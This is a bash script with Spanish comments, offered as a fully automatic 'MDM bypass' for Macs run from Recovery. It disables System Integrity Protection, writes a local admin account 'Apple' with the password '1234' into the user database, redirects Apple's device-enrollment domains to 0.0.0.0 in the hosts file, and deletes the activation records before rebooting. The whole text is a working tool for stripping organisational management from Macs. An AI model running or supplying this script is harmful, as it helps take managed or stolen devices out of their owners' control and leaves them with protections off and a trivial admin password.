#!/bin/bash

# ==============================================================================
# Bypass MDM - 100% Automático (Sin menús, sin preguntas)
# A prueba de Recovery y discos con nombres en portugués/español
# ==============================================================================

echo "=================================================="
echo "      INICIANDO BYPASS MDM 100% AUTOMÁTICO        "
echo "=================================================="

# ─── 1. DETECCIÓN DE VOLÚMENES ───
SYS_VOL=""
DATA_VOL=""

echo "[*] Buscando discos reales (ignorando Recovery)..."

for v in /Volumes/*; do
  # OBLIGATORIO: Ignorar el disco de Recovery
  if [[ "$v" == *"Base System"* ]] || [[ "$v" == *"Recovery"* ]]; then
    continue
  fi

  # Buscar volumen de Sistema
  if [ -d "$v/System/Library" ]; then 
    SYS_VOL="$v"
  fi

  # Buscar volumen de Datos (el que tiene la base de datos de usuarios)
  if [ -d "$v/private/var/db/dslocal" ]; then 
    DATA_VOL="$v"
  fi
done

if [ -z "$SYS_VOL" ] || [ -z "$DATA_VOL" ]; then
  echo "[!] ERROR: No se encontraron los discos reales. Verifica que el disco no esté bloqueado por FileVault."
  exit 1
fi

echo "[✓] Volumen Sistema: $SYS_VOL"
echo "[✓] Volumen Datos:   $DATA_VOL"
echo ""

# ─── 2. DESACTIVAR SIP ───
echo "[*] Desactivando SIP..."
csrutil disable 2>/dev/null
echo "[✓] SIP Desactivado."
echo ""

# ─── 3. CREAR USUARIO ───
echo "[*] Creando usuario 'Apple'..."
DSCL="$DATA_VOL/private/var/db/dslocal/nodes/Default"

dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" UserShell "/bin/zsh"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" RealName "Apple"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" UniqueID "501"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" PrimaryGroupID "20"
dscl -f "$DSCL" localhost -create "/Local/Default/Users/Apple" NFSHomeDirectory "/Users/Apple"
dscl -f "$DSCL" localhost -passwd "/Local/Default/Users/Apple" "1234"
dscl -f "$DSCL" localhost -append "/Local/Default/Groups/admin" GroupMembership "Apple"

# Crear carpeta Home
mkdir -p "$DATA_VOL/Users/Apple"
echo "[✓] Usuario creado."
echo ""

# ─── 4. BLOQUEAR MDM ───
echo "[*] Bloqueando dominios MDM..."
HOSTS="$SYS_VOL/etc/hosts"
touch "$HOSTS" 2>/dev/null

grep -q "deviceenrollment.apple.com" "$HOSTS" || echo "0.0.0.0 deviceenrollment.apple.com" >> "$HOSTS"
grep -q "mdmenrollment.apple.com" "$HOSTS" || echo "0.0.0.0 mdmenrollment.apple.com" >> "$HOSTS"
grep -q "iprofiles.apple.com" "$HOSTS" || echo "0.0.0.0 iprofiles.apple.com" >> "$HOSTS"
echo "[✓] Dominios bloqueados."
echo ""

# ─── 5. AJUSTES FINALES ───
echo "[*] Aplicando configuraciones..."
CONFIG="$SYS_VOL/var/db/ConfigurationProfiles/Settings"
mkdir -p "$CONFIG"

touch "$DATA_VOL/private/var/db/.AppleSetupDone"
rm -rf "$CONFIG/.cloudConfigHasActivationRecord"
rm -rf "$CONFIG/.cloudConfigRecordFound"
touch "$CONFIG/.cloudConfigProfileInstalled"
touch "$CONFIG/.cloudConfigRecordNotFound"
echo "[✓] Configuraciones aplicadas."
echo ""

echo "=================================================="
echo "      ¡BYPASS COMPLETADO CON ÉXITO!               "
echo "=================================================="
echo "  El sistema se reiniciará en 3 segundos..."
echo "  Usuario: Apple"
echo "  Contraseña: 1234"
echo "=================================================="

sleep 3
reboot
